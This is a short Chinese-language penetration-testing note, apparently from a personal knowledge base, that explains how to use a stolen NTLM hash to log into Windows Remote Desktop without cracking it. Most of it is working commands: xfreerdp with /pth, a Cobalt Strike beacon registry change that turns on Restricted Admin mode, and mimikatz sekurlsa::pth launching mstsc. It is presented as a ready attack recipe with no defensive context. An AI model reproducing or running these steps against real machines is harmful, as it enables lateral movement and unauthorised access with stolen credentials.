有时候拿到了没办法破解的hash，但是又想rdp上去，这个时候可以尝试一下利用hash登陆rdp。<br />局限条件是 win10、win12的机子才可以利用，Windows 7和Server 2008默认不支持，需要安装2871997、2973351补丁。

<a name="7iUqe"></a>
## kali xfreerdp
安装一波<br />root@kali:~# apt-get install freerdp-x11

root@kali:~# xfreerdp /v:192.168.201.186 /u:XuanJian /pth:0c9dfe5b779d22c2d4107b054cf72efa<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626156707230-bbb61f89-c580-4007-b97e-7123f4b933d7.png#align=left&display=inline&height=616&originHeight=821&originWidth=1346&size=346932&status=done&style=none&width=1010)<br />但是会有报错信息。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626156878968-515908f3-2df2-4d67-bf10-b10eb6cf956c.png#align=left&display=inline&height=434&originHeight=578&originWidth=795&size=21849&status=done&style=none&width=596)<br />其实没关系，我们可以横向之后更改策略。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626156949511-e36a861f-35eb-433f-abfa-78519e2fddde.png#align=left&display=inline&height=61&originHeight=81&originWidth=843&size=6239&status=done&style=none&width=632)
```
beacon> shell REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626157140635-df203aee-c186-437f-8df9-761fb9862153.png#align=left&display=inline&height=437&originHeight=874&originWidth=1687&size=843436&status=done&style=none&width=843.5)

<a name="i09AP"></a>
## mimikaz
```
mimikatz.exe
privilege::debug
sekurlsa::pth /user:XuanJian /domain:192.168.201.186 /ntlm:0c9dfe5b779d22c2d4107b054cf72efa "/run:mstsc.exe /restrictedadmin"
```
sekurlsa::pth /user:XuanJian /domain:192.168.201.186 /ntlm:0c9dfe5b779d22c2d4107b054cf72efa "/run:mstsc.exe /restrictedadmin"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626157703417-7c190397-28e9-4eb3-9cda-8d22f114478a.png#align=left&display=inline&height=364&originHeight=727&originWidth=1392&size=539832&status=done&style=none&width=696)
